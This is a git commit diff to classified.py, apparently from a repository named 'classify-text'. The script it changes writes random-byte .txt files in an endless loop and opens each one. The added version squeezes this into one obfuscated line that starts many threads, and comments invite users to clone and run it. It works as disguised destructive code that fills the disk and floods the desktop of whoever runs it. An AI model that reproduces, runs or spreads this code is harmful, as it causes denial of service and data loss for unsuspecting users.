f3745917cf6158483d5f30ee3a5e0c60987de7ac
classify-text <dxjh112098@dxjh.hcc.edu.tw>
2026-03-06 18:21:15 +0800

    classified.py

--- classified.py
+++ classified.py
@@ -1,5 +1,4 @@
-import os,sys,random,subprocess
-while True:n=''.join(random.sample(os.urandom(16).hex(),8))+'.txt';open(n,'wb').write(os.urandom(random.randint(1000,10000)));(os.startfile(n) if sys.platform.startswith('win') else subprocess.run(['open' if sys.platform=='darwin' else 'xdg-open',n]))
+import os,sys,subprocess as s,threading as t;f=lambda:exec("while 1:n=os.urandom(4).hex()+'.txt';open(n,'wb').write(os.urandom(4096));os.startfile(n)if sys.platform[0]=='w'else s.Popen(['open'if sys.platform=='darwin'else'xdg-open',n])");[t.Thread(target=f,daemon=1).start()for _ in range(os.cpu_count()*2)];input()
 #git clone https://github.com/classify-text/classified
 #cd classified
 #python3 classified.py
